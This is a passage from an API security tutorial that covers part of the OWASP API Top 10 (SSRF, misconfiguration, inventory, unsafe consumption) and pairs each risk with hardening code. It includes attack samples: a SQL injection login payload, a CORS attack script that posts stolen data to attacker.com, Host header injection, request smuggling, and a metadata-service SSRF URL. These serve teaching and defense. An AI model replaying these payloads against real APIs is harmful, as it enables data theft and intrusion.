function isAllowedUrl(urlString) {
    try {
        const url = new URL(urlString);
        
        // Check protocol
        if (!['http:', 'https:'].includes(url.protocol)) {
            return false;
        }
        
        // Check domain against allowlist
        const hostname = url.hostname.toLowerCase();
        const allowed = ALLOWED_DOMAINS.some(domain => 
            hostname === domain || hostname.endsWith(`.${domain}`)
        );
        
        return allowed;
    } catch {
        return false;
    }
}

app.post('/api/import', authenticate, async (req, res) => {
    const url = req.body.url;
    
    if (!isAllowedUrl(url)) {
        return res.status(400).json({ 
            error: 'URL not allowed' 
        });
    }
    
    const response = await axios.get(url);
    // Process data...
});
```

**Defense 2: Blocklist internal IPs**
```javascript
const ipaddr = require('ipaddr.js');

function isInternalIP(hostname) {
    try {
        const addr = ipaddr.process(hostname);
        
        // Check for private ranges
        if (addr.range() === 'private' || 
            addr.range() === 'loopback' ||
            addr.range() === 'linkLocal') {
            return true;
        }
        
        // Check for metadata service
        if (hostname === '169.254.169.254' || 
            hostname === 'metadata.google.internal') {
            return true;
        }
        
        return false;
    } catch {
        return false;
    }
}

app.post('/api/fetch', authenticate, async (req, res) => {
    const url = new URL(req.body.url);
    
    if (isInternalIP(url.hostname)) {
        return res.status(400).json({ 
            error: 'Access to internal resources not allowed' 
        });
    }
    
    // Proceed...
});
```

**Defense 3: Separate network segment for outbound requests**
```
Architecture:
Application Servers (DMZ)
    ↓ (Can only access)
Proxy Server (Controlled outbound)
    ↓ (Filtered access to)
Internet

Internal services NOT accessible from DMZ
→ SSRF impact limited
```

## API8:2023 - Security Misconfiguration

### What is security misconfiguration in APIs?

**Definition:** Improperly configured security settings, outdated software, unnecessary features enabled, or missing security patches.

**Common in APIs due to:**
- Complex distributed architectures
- Multiple deployment environments
- Microservices with inconsistent configurations
- Default settings retained in production

### Common misconfigurations

**Misconfiguration 1: Verbose error messages**
```http
POST /api/login HTTP/1.1
{"username": "admin' OR '1'='1", "password": "pass"}

Response (misconfigured):
{
    "error": "SQL syntax error near 'admin' OR '1'='1'",
    "query": "SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'",
    "file": "/var/www/api/controllers/auth.js",
    "line": 42,
    "stack": "Error: SQL injection detected\n    at Database.query (/var/www/api/db.js:156)\n..."
}

Exposes:
- SQL query structure
- File paths
- Technology stack
- Vulnerability presence
```

**Misconfiguration 2: CORS misconfiguration**
```http
OPTIONS /api/users HTTP/1.1
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

Allows any origin with credentials
→ CSRF attacks possible
```

**Misconfiguration 3: Debug endpoints enabled**
```http
GET /api/debug/config HTTP/1.1

Response:
{
    "database": {
        "host": "db.internal",
        "username": "api_user",
        "password": "SuperSecret123!"
    },
    "apiKeys": {
        "stripe": "sk_live_...",
        "aws": "AKIA..."
    },
    "jwtSecret": "my-secret-key"
}

Debug endpoint exposed in production!
```

**Misconfiguration 4: Missing security headers**
```http
GET /api/data HTTP/1.1

Response:
HTTP/1.1 200 OK
Content-Type: application/json

Missing headers:
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: ...
Strict-Transport-Security: ...
```

**Misconfiguration 5: Default credentials**
```http
Admin panel accessible at:
/admin

Default credentials work:
Username: admin
Password: admin
```

### Web Security Academy alignment

**Relevant topics:**

**1. Cross-Origin Resource Sharing (CORS)**

**Vulnerable CORS:**
```javascript
app.use((req, res, next) => {
    // Reflects any origin
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
```

**Attack:**
```javascript
// Attacker's page
fetch('https://api.example.com/user/data', {
    credentials: 'include'  // Include cookies
}).then(r => r.json())
  .then(data => {
      // Send stolen data to attacker
      fetch('https://attacker.com/collect', {
          method: 'POST',
          body: JSON.stringify(data)
      });
  });
```

**2. Information Disclosure**

**Stack traces in production:**
```http
GET /api/nonexistent HTTP/1.1

Response:
{
    "error": "Cannot GET /api/nonexistent",
    "stack": "Error: Route not found\n    at /app/node_modules/express/lib/router/index.js:280\n    at /app/node_modules/express/lib/router/index.js:317\n...",
    "env": "production",
    "version": "Express 4.17.1",
    "nodeVersion": "v14.17.0"
}

Exposes technology versions
→ Known vulnerabilities exploitable
```

**3. HTTP Host Header Attacks**

**Host header injection:**
```http
POST /api/password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@example.com"}

If server uses Host header in reset link:
Reset link: https://attacker.com/reset?token=abc123
Victim clicks link → Token sent to attacker
```

**4. HTTP Request Smuggling**

**CL.TE vulnerability:**
```http
POST /api/submit HTTP/1.1
Host: api.example.com
Content-Length: 49
Transfer-Encoding: chunked

0

POST /api/admin HTTP/1.1
Host: api.example.com

→ Smuggled request to admin endpoint
```

### Mitigation strategies

**Defense 1: Secure error handling**
```javascript
// Production error handler
app.use((err, req, res, next) => {
    // Log full error internally
    console.error({
        error: err.message,
        stack: err.stack,
        url: req.url,
        method: req.method,
        user: req.user?.id,
        timestamp: new Date()
    });
    
    // Return generic error to client
    if (process.env.NODE_ENV === 'production') {
        res.status(500).json({
            error: 'Internal server error',
            requestId: req.id
        });
    } else {
        // Detailed errors in development only
        res.status(500).json({
            error: err.message,
            stack: err.stack
        });
    }
});
```

**Defense 2: Secure CORS configuration**
```javascript
const cors = require('cors');

const allowedOrigins = [
    'https://example.com',
    'https://app.example.com'
];

app.use(cors({
    origin: (origin, callback) => {
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**Defense 3: Security headers**
```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'"],
            imgSrc: ["'self'", "data:", "https:"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    frameguard: { action: 'deny' },
    noSniff: true,
    xssFilter: true
}));
```

**Defense 4: Environment-based configuration**
```javascript
// config.js
module.exports = {
    production: {
        debug: false,
        logging: 'error',
        showStack: false
    },
    development: {
        debug: true,
        logging: 'debug',
        showStack: true
    }
};

// Only enable debug routes in development
if (process.env.NODE_ENV === 'development') {
    app.get('/debug/config', debugConfigHandler);
}
```

## API9:2023 - Improper Inventory Management

### What is improper inventory management?

**Definition:** Organizations lack visibility into their API landscape, leading to outdated, unpatched, or forgotten APIs remaining accessible.

**Common issues:**
- Old API versions still accessible
- Shadow APIs (undocumented, unknown)
- Deprecated endpoints not removed
- Development/staging APIs exposed
- Documentation out of date

### Attack scenarios

**Scenario 1: Old API versions with known vulnerabilities**
```http
Current (patched):
GET /api/v3/users HTTP/1.1

Old (vulnerable):
GET /api/v1/users HTTP/1.1
GET /api/v2/users HTTP/1.1

Old versions may have:
- Authentication bypass
- SQL injection
- Missing authorization checks

Still accessible → Exploitable
```

**Scenario 2: Shadow APIs**
```http
Production API (monitored):
https://api.example.com/users

Development API (forgotten):
https://dev-api.example.com/users
https://api-staging.example.com/users
https://api.example.com:8080/users

Development versions may have:
- Debug features enabled
- Weaker authentication
- Test accounts with admin access
```

**Scenario 3: Deprecated endpoints**
```http
Documentation says deprecated:
POST /api/old/upload

But endpoint still works:
POST /api/old/upload HTTP/1.1

May lack modern security controls
→ Unrestricted file upload
```

**Scenario 4: Microservices exposure**
```http
Frontend should access via API gateway:
https://api.example.com/gateway

Direct microservice access also possible:
https://users-service.example.com:3001/
https://orders-service.example.com:3002/
https://payments-service.example.com:3003/

Microservices may lack authentication
→ Direct access bypasses gateway controls
```

### Web Security Academy alignment

**Relevant topic: API Testing**

**Discovery techniques:**

**1. Version enumeration**
```
Test common version patterns:
/api/v1/
/api/v2/
/api/v3/
/v1/api/
/v2/api/
/1.0/api/
/2.0/api/
```

**2. Subdomain discovery**
```
Common API subdomains:
api.example.com
api-dev.example.com
api-staging.example.com
api-test.example.com
api-internal.example.com
api-v1.example.com
api-legacy.example.com
```

**3. Port scanning**
```
Common API ports:
:3000 (Node.js)
:8000 (Python)
:8080 (Tomcat/Java)
:4000 (GraphQL)
:5000 (Flask)
```

**4. Documentation review**
```
Check documentation for:
- Deprecated endpoints still accessible
- Old examples with outdated URLs
- Version history references
```

### Mitigation strategies

**Defense 1: API inventory and documentation**
```yaml
# api-inventory.yaml
apis:
  - name: User API
    version: v3
    baseUrl: https://api.example.com/v3/users
    status: active
    lastUpdated: 2026-02-01
    
  - name: User API
    version: v2
    baseUrl: https://api.example.com/v2/users
    status: deprecated
    sunsetDate: 2026-03-01
    
  - name: User API
    version: v1
    baseUrl: https://api.example.com/v1/users
    status: decommissioned
    removedDate: 2025-12-31
```

**Defense 2: Version sunset policy**
```javascript
// Enforce API version sunset
app.use('/api/v1/*', (req, res) => {
    res.status(410).json({
        error: 'This API version has been sunset',
        sunsetDate: '2025-12-31',
        currentVersion: 'v3',
        migrationGuide: 'https://docs.example.com/migration-v1-to-v3'
    });
});

// Deprecation warnings for old versions
app.use('/api/v2/*', (req, res, next) => {
    res.setHeader('Deprecation', 'true');
    res.setHeader('Sunset', 'Wed, 01 Mar 2026 00:00:00 GMT');
    res.setHeader('Link', '<https://api.example.com/v3>; rel="successor-version"');
    next();
});
```

**Defense 3: Environment isolation**
```
Production: api.example.com (public)
Staging: api-staging.example.internal (internal only)
Development: api-dev.example.internal (internal only)

Firewall rules:
- Production: Public access with authentication
- Staging/Dev: Internal network only
```

**Defense 4: API Gateway**
```
All traffic through gateway:
https://api.example.com/gateway/

Gateway routes to internal services:
- Enforces authentication
- Enforces rate limiting
- Logs all requests
- Blocks direct service access

Prevent direct microservice access:
Network policies block external access to internal service ports
```

## API10:2023 - Unsafe Consumption of APIs

### What is unsafe consumption of APIs?

**Definition:** Application consumes third-party or internal APIs without proper validation, allowing compromised APIs to affect the consuming application.

**Supply chain risk:**
```
Your API → Consumes Third-Party API → If compromised, affects your API
```

**Common scenarios:**
- Trusting third-party API responses without validation
- No timeout enforcement on external calls
- Exposing third-party data directly to users
- Following redirects from external APIs

### Attack scenarios

**Scenario 1: Malicious data injection**
```javascript
// Your API calls third-party API
app.get('/api/weather', async (req, res) => {
    const city = req.query.city;
    
    // Call external weather API
    const response = await axios.get(
        `https://weather-api.com/current?city=${city}`
    );
    
    // Directly return response (dangerous!)
    res.json(response.data);
});

// If weather API compromised:
{
    "temperature": 25,
    "condition": "Sunny",
    "malicious": "<script>steal_cookies()</script>"
}

// XSS vulnerability in your application!
```

**Scenario 2: SSRF via API consumption**
```javascript
// Your API fetches user avatar from third-party profile service
app.get('/api/user/avatar', async (req, res) => {
    const userId = req.query.id;
    
    // Fetch from third-party API
    const profile = await axios.get(
        `https://profile-service.com/users/${userId}`
    );
    
    const avatarUrl = profile.data.avatarUrl;
    
    // Fetch avatar (no validation!)
    const avatar = await axios.get(avatarUrl);
    
    res.send(avatar.data);
});

// If profile-service compromised:
{
    "avatarUrl": "http://169.254.169.254/latest/meta-data/"
}

// SSRF vulnerability in your application!
```

**Scenario 3: Redirect manipulation**
```javascript
// Payment callback from third-party processor
app.get('/api/payment/callback', async (req, res) => {
    const sessionId = req.query.session;
    
    // Verify payment with processor
    const payment = await axios.get(
        `https://payment-processor.com/verify/${sessionId}`,
        { maxRedirects: 10 }  // Follows redirects
    );
    
    // Process payment...
});

// If payment processor compromised or vulnerable:
// Redirect to attacker-controlled endpoint
Location: https://attacker.com/steal-session

// Session data leaked to attacker
```

**Scenario 4: Denial of service via slow API**
```javascript
app.get('/api/aggregate-data', async (req, res) => {
    // Call multiple third-party APIs (no timeouts!)
    const results = await Promise.all([
        axios.get('https://api1.com/data'),
        axios.get('https://api2.com/data'),
        axios.get('https://api3.com/data')
    ]);
    
    res.json(results);
});

// If any API is slow or malicious:
// Hangs for minutes/hours
// Your API becomes unresponsive
// Resource exhaustion
```

### Web Security Academy alignment

**Relevant topic: API Testing**

**Key security principles:**

**1. Validate all external data**
```javascript
const Ajv = require('ajv');
const ajv = new Ajv();

const weatherSchema = {
    type: 'object',
    properties: {
        temperature: { type: 'number', minimum: -100, maximum: 100 },
        condition: { type: 'string', maxLength: 50 },
        humidity: { type: 'number', minimum: 0, maximum: 100 }
    },
    required: ['temperature', 'condition'],
    additionalProperties: false  // Reject unexpected properties
};

const validateWeather = ajv.compile(weatherSchema);

app.get('/api/weather', async (req, res) => {
    const response = await axios.get(
        `https://weather-api.com/current?city=${req.query.city}`
    );
    
    // Validate response
    if (!validateWeather(response.data)) {
        console.error('Invalid weather data:', validateWeather.errors);
        return res.status(500).json({ 
            error: 'Unable to fetch weather data' 
        });
    }
    
    // Safe to return validated data
    res.json(response.data);
});
```

**2. Implement timeouts**
```javascript
app.get('/api/aggregate', async (req, res) => {
    try {
        const results = await Promise.all([
            axios.get('https://api1.com/data', { timeout: 5000 }),
            axios.get('https://api2.com/data', { timeout: 5000 }),
            axios.get('https://api3.com/data', { timeout: 5000 })
        ]);
        
        res.json(results);
    } catch (err) {
        if (err.code === 'ECONNABORTED') {
            res.status(504).json({ error: 'External service timeout' });
        } else {
            res.status(500).json({ error: 'External service error' });
        }
    }
});
```

**3. Sanitize and filter responses**
```javascript
const DOMPurify = require('isomorphic-dompurify');

app.get('/api/content', async (req, res) => {
    const response = await axios.get('https://external-cms.com/article');
    
    // Sanitize HTML content
    const sanitized = {
        title: response.data.title.substring(0, 200),  // Limit length
        content: DOMPurify.sanitize(response.data.content),  // Remove scripts
        author: response.data.author.replace(/[^a-zA-Z0-9 ]/g, '')  // Alphanumeric only
    };
    
    res.json(sanitized);
});
```

**4. Disable automatic redirects**
```javascript
app.get('/api/verify', async (req, res) => {
    const response = await axios.get('https://third-party.com/verify', {
        maxRedirects: 0,  // Don't follow redirects
        validateStatus: (status) => status < 400
    });
    
    // Process response...
});
```

### Complete secure API consumption

```javascript
const axios = require('axios');
const Ajv = require('ajv');
const DOMPurify = require('isomorphic-dompurify');

const ajv = new Ajv();

// Response schema
const thirdPartySchema = {
    type: 'object',
    properties: {
        data: { type: 'string', maxLength: 10000 },
        status: { type: 'string', enum: ['success', 'error'] }
    },
    required: ['data', 'status'],
    additionalProperties: false
};

const validate = ajv.compile(thirdPartySchema);

// Secure API consumption
app.get('/api/external-data', authenticate, async (req, res) => {
    try {
        // 1. Validate input
        const userId = parseInt(req.query.userId);
        if (isNaN(userId) || userId < 1) {
            return res.status(400).json({ error: 'Invalid user ID' });
        }
        
        // 2. Call external API with security measures
        const response = await axios.get(
            `https://trusted-api.com/users/${userId}`,
            {
                timeout: 5000,  // 5 second timeout
                maxRedirects: 0,  // No redirects
                headers: {
                    'X-API-Key': process.env.THIRD_PARTY_API_KEY
                },
                validateStatus: (status) => status === 200  // Only accept 200
            }
        );
        
        // 3. Validate response structure
        if (!validate(response.data)) {
            console.error('Invalid response schema:', validate.errors);
            return res.status(500).json({ 
                error: 'External service returned invalid data' 
            });
        }
        
        // 4. Sanitize response data
        const sanitized = {
            data: DOMPurify.sanitize(response.data.data),
            status: response.data.status
        };
        
        // 5. Return safe data
        res.json(sanitized);
        
    } catch (err) {
        // Log internally
        console.error('External API error:', err.message);
        
        // Generic error to client
        if (err.code === 'ECONNABORTED') {
            res.status(504).json({ error: 'External service timeout' });
        } else if (err.response) {
            res.status(502).json({ error: 'External service error' });
        } else {
            res.status(500).json({ error: 'Internal error' });
        }
    }
});
```

## OWASP API Top 10 mapping

| OWASP Risk | Web Security Concept | Primary Defense |
|------------|---------------------|-----------------|
| **API1: BOLA** | Insecure Direct Object Reference | Check resource ownership |
| **API2: Broken Auth** | Authentication bypass | Strong tokens, expiration |
| **API3: Broken Property Auth** | Mass assignment | Property allowlisting |
| **API4: Resource Consumption** | DoS, rate limiting | Throttling, quotas |
| **API5: Broken Function Auth** | Privilege escalation | Role-based access control |
| **API6: Business Flow** | Logic abuse | CAPTCHA, behavioral analysis |
| **API7: SSRF** | Internal system access | URL validation, network isolation |
| **API8: Misconfiguration** | Information disclosure | Secure defaults, error handling |
| **API9: Inventory Management** | Shadow APIs | API catalog, version sunset |
| **API10: Unsafe Consumption** | Supply chain attack | Input validation, timeouts |
